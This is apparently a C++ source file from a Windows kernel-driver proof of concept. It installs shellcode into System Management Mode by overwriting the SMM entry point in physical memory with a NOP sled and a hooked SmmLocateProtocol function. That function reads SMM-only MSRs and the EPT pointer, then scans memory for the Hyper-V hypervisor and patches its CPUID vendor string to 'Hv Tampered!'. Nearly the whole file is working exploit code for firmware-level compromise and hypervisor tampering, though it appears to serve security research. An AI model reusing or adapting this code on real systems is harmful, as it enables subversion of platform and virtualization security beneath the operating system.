#include "SmmShellCode.hpp"

//
// See EFI_LOCATE_PROTOCOL for the prototype.
//
static
EFI_STATUS
EFIAPI
HookedSmmLocateProtocol (
    EFI_GUID* Protocol,
    PVOID Registration,
    PVOID* Interface
    )
{
    HOOKED_SMM_LOCATE_PROTOCOL_PARAMETER_BLOCK* block;

    UNREFERENCED_PARAMETER(Protocol);
    UNREFERENCED_PARAMETER(Registration);
    UNREFERENCED_PARAMETER(Interface);

    block = static_cast<HOOKED_SMM_LOCATE_PROTOCOL_PARAMETER_BLOCK*>(nullptr);

    //
    // Read SMM-only accessible MSRs.
    //
    block->Smbase = __readmsr(0x9e);
    block->SmmFeatureControl = __readmsr(0x4e0);
    block->SmmMcaCap = __readmsr(0x17d);

    //
    // Setting of "enable EPT" VM-execution control. This is available only when
    // the bit 1 of the other field at 0x7EE0 is set.
    //
    if ((*static_cast<PULONG32>(Add2Ptr(block->Smbase, 0x8000 + 0x7EE0)) & 1) == 1)
    {
        block->Eptp = *static_cast<PULONG64>(Add2Ptr(block->Smbase, 0x8000 + 0x7ED8));
    }
    else
    {
        block->Eptp = 0;
    }

    //
    // Find Hyper-V (hvix64.exe) code to patch if Hyper-V is present.
    //
    // When Hyper-V is enabled, there is a large reserved physical memory region
    // starting at 0x100000000 (just above 4GB) that is not readable from the OS.
    // We will start scanning this region up to a somewhat arbitrary size.
    // NB: Those hard coded numbers may be removed by consulting
    //     HKLM\HARDWARE\RESOURCEMAP\System Resources\Reserved\.Translated
    // The signature is expected appear at the large page (2MB boundary) so skip
    // over that much on mismatch.
    //
    block->HvPatchedAddress = 0;
    if (block->Eptp == 0)
    {
        goto Exit;
    }

    for (ULONG64 address = 0x100000000; address < 0x108000000; address += 0x200000)
    {
        //
        // hvix64.exe's code section starts with at least 8 bytes of 0xCC
        //
        if (*reinterpret_cast<PULONG64>(address) != 0xCCCCCCCCCCCCCCCC)
        {
            continue;
        }

        //
        // Find code that sets "Microsoft Hv" as the result of CPUID:4000000h.
        //
        // 6F 73 6F 66 41 C7 41 0C is the pattern for 18362 and known not to work
        // on 19042.
        //
        for (ULONG offset = 0; offset < 0x200000; offset += 0x10)
        {
            if (*reinterpret_cast<PULONG64>(address + offset) != 0x0C41C741666F736F)
            {
                continue;
            }

            //
            // Found it. Patch it to return "Hv Tampered!" instead.
            //
            block->HvPatchedAddress = address + offset;
            *reinterpret_cast<PULONG>(block->HvPatchedAddress - 8) = 'T vH';
            *reinterpret_cast<PULONG>(block->HvPatchedAddress    ) = 'epma';
            *reinterpret_cast<PULONG>(block->HvPatchedAddress + 8) = '!der';
            goto Exit;
        }
    }

Exit:
    //
    // I think this is a security violation. Report it.
    //
    return EFI_SECURITY_VIOLATION;
}

static void HookedSmmLocateProtocolZZZ() {}

SmmShellCode::SmmShellCode (
    ) :
    m_FunctionSize(reinterpret_cast<ULONG64>(HookedSmmLocateProtocolZZZ) -
        reinterpret_cast<ULONG64>(HookedSmmLocateProtocol)),
    m_ShellCodeSize(k_NopSledSize + m_FunctionSize)
{
}

NTSTATUS
SmmShellCode::Install (
    const PhysicalMemory& Pm
    )
{
    NTSTATUS status;
    PVOID originalCode;
    UCHAR nops[k_NopSledSize];

    originalCode = ExAllocatePoolWithTag(NonPagedPoolNx, m_ShellCodeSize, k_PoolTag);
    if (originalCode == nullptr)
    {
        DEMO_ERROR("Memory allocation failed: %llu", m_ShellCodeSize);
        status = STATUS_INSUFFICIENT_RESOURCES;
        goto Exit;
    }

    status = Pm.Read(originalCode, k_ShellCodeEntryPoint, m_ShellCodeSize);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("Read failed : %08x", status);
        goto Exit;
    }

    RtlFillMemory(nops, sizeof(nops), 0x90);
    status = Pm.Write(k_ShellCodeEntryPoint, nops, sizeof(nops));
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("Write failed : %08x", status);
        goto Exit;
    }

    status = Pm.Write(k_ShellCodeAddress, reinterpret_cast<PVOID>(HookedSmmLocateProtocol), m_FunctionSize);
    if (!NT_SUCCESS(status))
    {
        DEMO_ERROR("Write failed. System left corrupted : %08x", status);
        goto Exit;
    }

    m_OriginalCode = originalCode;
    m_Pm = &Pm;

Exit:
    if (!NT_SUCCESS(status))
    {
        if (originalCode != nullptr)
        {
            ExFreePoolWithTag(originalCode, k_PoolTag);
        }
    }
    return status;
}

SmmShellCode::~SmmShellCode (
    )
{
    if (m_OriginalCode != nullptr)
    {
        NTSTATUS status;

        status = m_Pm->Write(k_ShellCodeEntryPoint, m_OriginalCode, m_ShellCodeSize);
        if (!NT_SUCCESS(status))
        {
            DEMO_ERROR("Write failed. System left corrupted : %08x", status);
        }
        ExFreePoolWithTag(m_OriginalCode, k_PoolTag);
    }
}

